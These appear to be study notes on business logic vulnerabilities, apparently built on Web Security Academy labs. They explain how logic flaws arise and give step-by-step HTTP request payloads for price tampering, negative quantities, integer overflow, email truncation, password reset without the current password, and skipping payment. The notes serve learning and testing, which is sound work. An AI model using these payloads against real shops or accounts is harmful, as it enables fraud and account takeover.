



# 1. Business Logic Vulnerabilities

Business logic vulnerabilities are flaws in an application's design that allow attackers to manipulate legitimate functionality for malicious purposes — typically by exploiting unusual application states that developers failed to anticipate or handle safely.

> **Note:** "Business logic" refers to the rules governing how an application operates. These vulnerabilities are also called **application logic vulnerabilities** or **logic flaws**.

Unlike technical bugs, logic flaws are invisible during normal use. Attackers exploit them by interacting with the app in unintended ways — such as skipping purchase steps, altering transaction values, or passing unexpected input to trigger unintended server-side behavior.

---

## How Do Business Logic Vulnerabilities Arise?

They stem from **flawed assumptions** developers make about how users will interact with the application — leading to inadequate input validation. A common example: assuming users only interact via a browser, causing the app to rely on weak client-side controls that are easily bypassed with an intercepting proxy.

When an attacker deviates from expected behavior, the application simply isn't equipped to handle it safely.

> **Complex systems are especially at risk.** Developers working on large codebases may not fully understand how all components interact. One team member's wrong assumption about another's code can quietly introduce serious logic flaws — particularly when those assumptions are never explicitly documented.

---

## Impact of Business Logic Vulnerabilities

The impact is **highly variable** — from trivial to critical — depending on what functionality is affected. Even quirky, hard-to-exploit logic should be fixed, as someone else may find a way.

Key risk areas:

- **Authentication flaws** → privilege escalation, full auth bypass, exposure of sensitive data
- **Financial logic flaws** → stolen funds, fraud, significant business losses
- **Indirect damage** → even without direct attacker gain, flawed logic can still harm the business

> The core principle: any unintended behavior is a potential attack vector. Severity scales with how critical the affected functionality is.

# 2. Examples of business logic vulnerabilities

Business logic vulnerabilities are relatively specific to the context in which they occur. However, although individual instances of logic flaws differ hugely, they can share many common themes. In particular, they can be loosely grouped based on the initial mistakes that introduced the vulnerability in the first place.

## 2.1 - Excessive trust in client-side controls

- **Flawed assumption:** users only interact via the web interface → leads to over-reliance on client-side validation
- **The reality:** attackers use tools like **Burp Proxy** to tamper with data after the browser sends it but before it hits server-side logic — bypassing client-side controls entirely
- **Root cause:** accepting data at face value without server-side validation or integrity checks
- **Impact:** highly variable but potentially devastating — affecting both business logic and overall site security, with relatively minimal attacker effort

productId=1&redir=PRODUCT&quantity=1&price=1

## 2.2 - Failing to Handle Unconventional Input

Business logic restricts user input to values that make sense for the application — such as numeric limits for inventory, budgets, or supply chain triggers. The problem arises when developers fail to anticipate edge cases, leaving unexpected inputs unhandled and potentially exploitable.

A classic example: **negative numeric values**. If an application doesn't explicitly reject them, an attacker can abuse this. Consider a bank transfer check:

```
if ($transferAmount <= $currentBalance) { // Complete the transfer }
```

Sending `-$1000` would always pass the balance check and reverse the transfer direction — effectively stealing funds from the victim.

> These flaws are easy to miss during development, especially when client-side controls mask the issue on the surface.

**When auditing, use tools like Burp Proxy and Repeater to test unconventional inputs** — extremely high/low numbers, abnormally long strings, unexpected data types. Ask yourself:

- Are there limits imposed on the data?
- What happens when those limits are reached?
- Is any transformation or normalization applied to the input?

If one form mishandles unconventional input, others on the same application likely will too.

### High-Level Logic Vulnerability – Negative Quantity Manipulation

The server accepts and applies client-supplied `quantity` values without enforcing a minimum constraint. Submitting a **negative quantity** causes the cart total to subtract value, allowing the total to drop below zero or within store credit range.

#### Steps

- Add a cheap item to cart normally
- Intercept the `POST /cart` request and modify `quantity` to a negative value
- Confirm the cart total decreases accordingly
- Add the target item (leather jacket) at normal quantity
- Apply a large enough negative quantity on the cheap item to bring the total within store credit
- Place the order

#### Payloads

```http
# Step 1: Test negative quantity acceptance
POST /cart HTTP/2
productId=4&quantity=-1&redir=CART

# Step 2: Drive total into negative territory
POST /cart HTTP/2
productId=4&quantity=-100&redir=CART

# Step 3: Add target item normally
POST /cart HTTP/2
productId=1&quantity=1&redir=CART

# Step 4: Offset jacket price with large negative quantity on cheap item
POST /cart HTTP/2
productId=4&quantity=-1000&redir=CART
```

### Low-Level Logic Flaw – Integer Overflow

The backend stores cart totals as a **signed 32-bit integer** (max: `2,147,483,647` cents). By repeatedly adding high-priced items in bulk, the cumulative total overflows past the ceiling and **wraps to a large negative value** (`-2,147,483,648`). Fine-tuning the final quantity lands the total between `$0` and available store credit, bypassing the payment check entirely.

#### Steps

- Server only accepts up to 2-digit quantities per request
- Use Burp Intruder with `Null payloads` set to `Continue indefinitely` and max concurrent requests to `1`, to flood the cart and trigger the overflow
- Monitor cart total until it flips to a large negative integer
- Clear cart, then re-run Intruder with exactly `323` payloads to get a controlled overflow
- Send a manual request for `47` more jackets — total should land at `-$1221.96`
- Add a cheap filler item to nudge the total into the `$0–$100` store credit range
- Place the order

#### Payloads

```http
# Step 1: Probe max quantity per request
POST /cart HTTP/2
productId=1&quantity=99&redir=CART

# Step 2: Flood via Intruder (null payloads, indefinite) until overflow occurs
POST /cart HTTP/2
productId=1&quantity=99&redir=CART

# Step 3: Clear cart, re-run Intruder with exactly 323 payloads
POST /cart HTTP/2
productId=1&quantity=99&redir=CART

# Step 4: Fine-tune with 47 manual jackets → total = -$1221.96
POST /cart HTTP/2
productId=1&quantity=47&redir=CART

# Step 5: Add cheap filler item to bring total to $0–$100
POST /cart HTTP/2
productId=2&quantity=<calculated>&redir=CART
```

### Inconsistent Handling of Exceptional Input – Email Truncation to Bypass Domain Restriction

The server truncates stored email addresses at **255 characters** but doesn't validate the truncated result. By crafting an email where `@dontwannacry.com` lands exactly at character 255, the app delivers the confirmation to the attacker's real mail server while storing the truncated `@dontwannacry.com` address — granting admin-tier access.

#### Steps

- Discover `/admin` via content discovery — note it requires a `@dontwannacry.com` account
- Register with a 200+ character email to confirm the 255-character truncation behavior on the account page
- Calculate the exact padding needed so `@dontwannacry.com` ends at character 255, with your real mail server domain appended after as a subdomain
- Register a new account using that crafted email — confirmation is delivered to your inbox, but the stored address is truncated to `@dontwannacry.com`
- Log in and access `/admin`, then delete `carlos`

#### Payloads

```http
# Step 1: Probe truncation — register with 200+ char email, check account page trims at 255
POST /register HTTP/2
username=attacker&email=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@YOUR-EMAIL-ID.web-security-academy.net&password=password

# Step 2: Craft email so "@dontwannacry.com" ends exactly at char 255
# Total local part = 255 - len("@dontwannacry.com") = 255 - 17 = 238 chars before the @
POST /register HTTP/2
username=attacker2&email=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@dontwannacry.com.YOUR-EMAIL-ID.web-security-academy.net&password=password

# Step 3: Click confirmation link from email client, then log in as admin level rights
GET /admin HTTP/2
```

## 2.3 - Making flawed assumptions about user behavior

**Making flawed assumptions about user behavior** is a root cause of logic vulnerabilities. Developers often fail to account for dangerous scenarios that violate their assumptions — the following examples illustrate how such assumptions lead to logic flaws.

---

### Trusted users won't always remain trustworthy

Applications often assume that users who passed initial security controls can be **trusted indefinitely**, leading to lax enforcement thereafter. If business rules aren't applied **consistently throughout**, dangerous loopholes can emerge for attackers to exploit.

#### Inconsistent Security Controls – Post-Registration Email Change to Gain Admin Access

The app restricts `/admin` to `@dontwannacry.com` accounts but only enforces this check against the **current email on file** — not the one used at registration. Since the email change feature has no domain restriction, any registered user can swap to a `@dontwannacry.com` address post-registration and immediately gain admin access.

##### Steps

- Discover `/admin` — note it requires a `@dontwannacry.com` account
- Register normally using your lab-provided email to receive the confirmation link
- Log in, navigate to account settings, and change email to any `@dontwannacry.com` address
- Access `/admin`

##### Payloads

```http
# Step 1: Register with your real lab email
POST /register HTTP/2
username=attacker&email=attacker@YOUR-EMAIL-ID.web-security-academy.net&password=password

# Step 2: Update email to a dontwannacry.com address (no verification required)
POST /my-account/change-email HTTP/2
email=attacker@dontwannacry.com

# Step 3: Delete carlos via admin panel
GET /admin HTTP/2
```

---

### Users won't always supply mandatory input

Attackers can tamper with or **remove parameters entirely**, bypassing browser-level input validation. When multiple functions share a server-side script, absent parameters may unlock unintended code paths.

When probing for logic flaws, remove each parameter in turn and observe the response. Make sure to:

* Remove **one parameter at a time** to hit all relevant code paths.
* Delete the **parameter name** as well as the value — servers often handle these differently.
* **Follow multi-stage processes** to completion, as tampering in one step may affect later ones.

Apply this to URL params, POST params, and **cookies**.

#### Weak Isolation on Dual-Use Endpoint – Password Change Without Authentication

The password change endpoint uses a client-supplied `username` parameter to determine which account to modify, and only performs the current-password check if the parameter is **present**. Dropping `current-password` entirely bypasses the check, allowing an attacker to set a new password on any account — including `administrator`.

##### Steps

- Log in and trigger a normal password change to capture the request
- Remove the `current-password` parameter entirely from the request
- Change `username` to `administrator` and set a new password of your choice
- Log out, log in as `administrator` with the new password
- Access `/admin`

##### Payloads

```http
# Step 1: Normal password change (captured baseline)
POST /my-account/change-password HTTP/2
username=wiener&current-password=peter&new-password-1=test&new-password-2=test

# Step 2: Drop current-password param and target administrator
POST /my-account/change-password HTTP/2
username=administrator&new-password-1=hacked&new-password-2=hacked

# Step 3: Delete carlos via admin panel
GET /admin HTTP/2
```

---

### Users won't always follow the intended sequence

Attackers won't follow intended workflows — failing to account for this enables dangerous flaws. For example, skipping 2FA by jumping directly to authenticated pages bypasses the verification step entirely. Using tools like Burp Proxy, attackers can replay requests in any order, interacting with the application in unexpected states.

To identify these flaws, use **forced browsing** to submit requests out of sequence — skip steps, repeat them, or return to earlier ones. Note how steps are accessed (specific URLs vs. parameter sets) and identify developer assumptions to find where they can be violated.

Out-of-sequence testing often triggers exceptions with **null/uninitialized values** — pay close attention to any error messages or debug info, as these can reveal key backend behavior useful for refining an attack.

---

#### Insufficient Workflow Validation – Skipping Payment Step via Direct Confirmation Request

The server trusts that anyone reaching the order confirmation endpoint has already completed a valid payment step. There is **no server-side validation** tying a confirmation to an actual successful checkout — replaying `GET /cart/order-confirmation?order-confirmation=true` directly fulfills any order in the cart, bypassing payment entirely.

##### Steps

- Buy a cheap item normally to capture the confirmation request
- Add the leather jacket to cart
- Replay the captured confirmation request directly, skipping the checkout/payment step

##### Payloads

```http
# Step 1: Normal checkout (captured baseline)
POST /cart/checkout HTTP/2
csrf=<token>

# Step 2: Add leather jacket to cart
POST /cart HTTP/2
productId=1&quantity=1&redir=CART

# Step 3: Replay confirmation request directly — order fulfilled without payment
GET /cart/order-confirmation?order-confirmation=true HTTP/2
```
